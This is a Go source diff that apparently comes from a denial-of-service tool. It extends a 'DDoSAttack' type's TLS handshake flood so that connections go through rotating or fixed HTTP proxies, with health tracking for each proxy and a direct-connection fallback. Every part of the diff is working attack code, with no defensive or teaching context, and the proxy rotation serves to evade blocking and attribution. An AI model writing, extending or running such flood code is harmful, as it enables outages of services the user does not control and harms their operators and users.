@@ -52,17 +52,48 @@ func (d *DDoSAttack) performTLSHandshake() {
 
 	host, port, _ := d.parseTargetURL(d.config.TargetURL, useTLS)
 
-	// Create dialer
+	// Connect
+	var conn net.Conn
+	var err error
+	var usedProxy string
+
 	dialer := &net.Dialer{
 		Timeout: d.config.Timeout,
 	}
 
-	// Perform TLS handshake
-	tlsConfig := d.createTLSConfig()
-	conn, err := tls.DialWithDialer(dialer, "tcp", host+":"+port, tlsConfig)
+	// Proxy support for TLS handshake flood
+	if d.config.UseProxy {
+		// Rotate proxies if enabled
+		if d.config.RotateProxy {
+			if proxyURL, ok := d.getNextProxy(); ok {
+				usedProxy = proxyURL
+				conn, err = d.dialThroughHTTPProxy(dialer, proxyURL, host, port, useTLS)
+			}
+		} else if len(d.proxies) > 0 {
+			// Single-proxy mode: always use the first proxy
+			proxyURL := d.proxies[0]
+			usedProxy = proxyURL
+			conn, err = d.dialThroughHTTPProxy(dialer, proxyURL, host, port, useTLS)
+		}
+	}
+
+	// Fallback to direct connection if no proxy was used
+	if conn == nil && err == nil {
+		tlsConfig := d.createTLSConfig()
+		conn, err = tls.DialWithDialer(dialer, "tcp", host+":"+port, tlsConfig)
+	}
+
 	if err != nil {
 		atomic.AddInt64(&d.requestsFailed, 1)
+		if usedProxy != "" {
+			d.markProxyFailure(usedProxy)
+		}
 		return
+	}
+
+	// Successful connection via proxy – mark it healthy
+	if usedProxy != "" {
+		d.markProxySuccess(usedProxy)
 	}
 
 	// Close immediately after handshake completes
